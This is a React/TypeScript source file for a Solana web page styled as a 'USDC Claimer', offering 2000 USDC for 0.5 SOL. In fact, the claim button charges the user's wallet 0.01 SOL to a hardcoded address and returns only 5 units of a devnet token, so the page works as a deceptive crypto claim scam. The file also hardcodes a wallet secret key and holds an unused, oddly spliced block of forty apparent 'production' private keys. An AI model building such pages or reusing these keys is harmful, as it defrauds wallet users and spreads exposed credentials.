/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4SNfd2xYytE824V8w6vVEU1EsyQT5LYZCj81eKHqbWjSQT5RoBzpSwaV5ChzkmtvgPedcGHKAsnvgoTcyhbjEY3"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2LgY7GDavFaGzhV41tv4D5xswYfhbKTBaBrcfiWtpkXTvYtWoJk1Vd6mkSXesB3KW3fkBtiaNcmkKi4vgazSmRwi",
  "key1": "2RyaXoWnQUfTSXUGsFmg1wboe5Q4RfyjHthZmrExXcDtAvsUDprnnyCTFmMGAKhLjTUyRFWkcxpWJJDJJvEHBMUR",
  "key2": "tt2qgZeuEYUcHBPBYaE6qN3yaWXSKgtuiakt8NsHdR4fAoBsbCjfEKAh2mNqUq84FoTR8Hud26PdRje8JLW5q6r",
  "key3": "47VevtrqqbAMdiqTwNjFJrDUHBLPoCTwcafT9AVMBeAHky5ZRHM1xGhdC7F2L47riyGXu8FtDwcquXzjmdxK6Cun",
  "key4": "RiyCUA8qdKKResjgu2iwAJzcKb1bo6ddVUBFBNRQWQkRnct2HUpE2xkhrFhMH2idv7W3AvUqSHb83MUNoX72PdY",
  "key5": "3oQ8dxd8vJJkgjSsasffKvvaaMBsJzCtiRYYLfdnUjeuAvn8gTGM7Ee356osTko6Fm4aMnhv86NspjCX1c5KcrKc",
  "key6": "3ug1as7U8BAXXsr4Yd1JbE4e1ajHVAxx7L3dvLp2yJFYcycbE6yA35oe9d4MHoGZ7hbHUU3CoYLLduDbABzv8asM",
  "key7": "52zYGkRWKzpE3Ez2G69h8y3nwwBL2t68exZiaLwczZ2SNBJjueV2Yq5z24YRdB1VmsbjSVPp6WniKWiGcU3uHvkJ",
  "key8": "5CmFiviFSmJFaA11JfMj39cLgx4eAjE8kwzE7SSDrX3YagNqLtVhwkb1x4igt2pBEaRc6AnJHFh2oDp6KcvnBJSS",
  "key9": "3WsrLwxNNUqqDDaDBjRyjChg8QynYj6jdpNpr5NfCFyrNu98of8zsHwQhU5K4YvLHYUMVqsD6UmKKnpnn66iqrYU",
  "key10": "3qVXK8kT7X86Uuhb5ZE7ncFZfogPgh8rCDB3CyBXjQmthBHBQ2Rc2qUJmGRBctEARr2ZuafSRn12vYjvhbwvZaFF",
  "key11": "5jmuxXjRXGGZpqQR3XE4cbX5JY5c5DnqVyGfStVDDxq1H3x6hMQaGCT3JUmpwY5ih2fbDSCGkrKBrmEeYH4xuVF9",
  "key12": "1WSqBtqpoG1aiqQqXbFKY2ox7GyK123LfgD7eJZRA8dDm5SKYFFUh3VZBdXxPqRPr4TmVTcANqyZMmV3BVhre6V",
  "key13": "5L3VQtakvFcxNQFFVD9A9JikqudRZoaQe4yLauDzju54RacDzVBMcXmu4tjicxDRHfk7BWESaNGxd8DXDKUtMZVm",
  "key14": "2JSe1UGbWyvcHVBZNrFdRpN9nF8SLiCFBdiMG6n4E7iQD5w2wJ21bnqGfg6KDVPb47EaWp8kQYGG2PnDcgDkzoHk",
  "key15": "4kdpx79A5wMsTsx7PbYJYzhy3BYq1fMVhQfPj6GLTiBJjGgBD6BJ3dqe4aVHx4CJiCnwr6Xstd6HCV7JUPV9PfQi",
  "key16": "5qDpwFVwhdtiVW49cbM43KqQVKftPykJqgz6uEBrGdStAaUu6moGw9PZCnsaTZVsscowpWL44UMPR6VVDAdMajNV",
  "key17": "5cF1d96H94vxyvNzsb5vd1UdvRPiyFrJVZ6nVaNS4J3PgEHf9Apjyh4GwZ1KhX2LQYB3U2TTgg1ZjVvDtoPeorem",
  "key18": "HKDxsbyuXWyJYwCytXEciwNkWZHMZZhocTDajwGNkUQjYmEXjnbJNoEFgzDnjQKYpCReUnk8thNTzLoBWTwYThG",
  "key19": "2b29LRud7fA49X9VXi2kn19hETdLq4jB6sYhLxFfmgDa1e1RsgKzB3RGb75SmSpj4qgYTnx1GyFuZZZ4jzi1VCP2",
  "key20": "366TFkP8nvJmGsZPxa9jhqsybfd8i5KQTAMAWQF7JTJ1cM8bNR7xr6DqMziFnsMrJaRZ18dTAHunezMEzcbRna5b",
  "key21": "4Viug41Y7AF7kLKJ9m1dgaDvBrKR1BUrbyP2tECg9HY4Er2Rk4Dh48prhUmykZbCeKv6PwYGRTkcwpV5xLwQjn3X",
  "key22": "5eGNnRwEFfpkDTuqaod5Ykt6NRGavdhAV1ufRuBazi9cnE57KThXJrBmVXNZCUsAFEbw4s3hC2HH5RPPStVTpMK8",
  "key23": "4UPKmwzJMDnkxLfKqbxPkojaycvRjhvpVBhcKfWiQgxAoeyShFiAcf2Lm1BMQDwSBt1jKPHc6sYP6EBRgYurWude",
  "key24": "2Bh5kT69513g61ah9aWX2pxaRCG4hPH5RKZz9ZR9T9QyivgiWpng1LQF5EjxMvwCQPaM5efQCyjuk7rAdA1wBznk",
  "key25": "5wQGUd6HHxSgEZNdKi7zeJGAtYB7fcVruvznmrybJwoKJMagjmNUwFDAi5pj51rS9ySLdAnysM59khmxWqenBM4u",
  "key26": "34cw4q3TeAN1Jti63KAf2Ea6GUE4jD1FLXczFnUgiFV9zo5P9RR2wPXidKrrRhgcsj7VmeX3PEduBriKLWYsT7NZ",
  "key27": "R8A946Ssx8kZChZVY7iQD2vJC7GLNYipFCmviARoBq7FFsvHRao7jUqgszwuapBFpe1MMrt1KdZp3QE39RjKfHB",
  "key28": "3sFf5Qd8eDybS9xy7ipad6mAaBDaMvN7g7yff851pqtan6NoYyki58AEsm6zRgC4iYbCPBdizuEPdJyZ5VhoC8B",
  "key29": "FhEaGN8TYwBnwBhXa1Q66RRNqN4UQ3Tdgczvdw3gc24WpTrgLt6BGfWGiHxin8MwStKLQZzcMkQk9eosHLFwpKY",
  "key30": "3QY8eiw6BaUJfbpRrShqErbqyV2UJU7t8L6QJMiR7Z9MESHgeHetkJF8Nnt8xaYD2gCNoHMSCGsXCMcXxY22hziN",
  "key31": "5J8xsmgufJV6yPrBBd5BAyiAtVQaqtyhLtHLEXAgeVK3kuZMQKrmUc14SoZ42A3rxJi84GgQEPdKUm5Un84eCdC5",
  "key32": "4F2eMUFad66GBUhN74Zh9kYcDLbQoFZVCCPXLmkjJP25UN15ALgGDV3e36yzWC5ftHPzVx5rPGSVtFoYRicEHybG",
  "key33": "VE6xd1kTP3jhjm9CSUTSnhSKGXDmyxkCCBVPVksfFaYuSFau2HohSobB7J5mJS2xP8XupXcX9WsvbCirtzRXwA8",
  "key34": "37EBReRa5fCSkSZBu3SqpTCknNTnwnPtzo1A78Z5UC9b4DcmCq9b7zy4WYsbohhr8us2DywhgniKP4haZzEAknUx",
  "key35": "4KMfBdc6XeoZJfEcqxgdbBXCtFcWvybzLPzCiaRSnokC1aV9XLWZRrHkNrKNvBefc4rwU2MNrfxdcE6UihRtS2ZK",
  "key36": "3NK7ChT34vPa1fQzRmd44jBVYGvFSzLZC6TNEXqAyzT51faZvmSdcGJgqdio3LUWK7mAfuBNN7Pt1gSsHzuqXnZw",
  "key37": "5kup6GqCBNDLcPjKsceYZoeLsfiprH2tKrjyEEBbALpxzcuaZzjPXs3dgzA8rnNzoxCJsHqf2cbXRG73B6mQAgAZ",
  "key38": "5GwrXQiNzDdDyTEF6KpjVh3wA6hReUHSFs5fP4zyaVgHLJYTBquoJvGFw2Dn5WZLKJqjpZLMgp3TQvDNN7w89CFM",
  "key39": "5BDQFdRiufkTz5JZBGq3Aawwc6LkSrXZLqPjbawQJZ3r8p8QcUGKDAS7oSrQY942neDeGyxQ9rT84UD6TCcGLty5"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
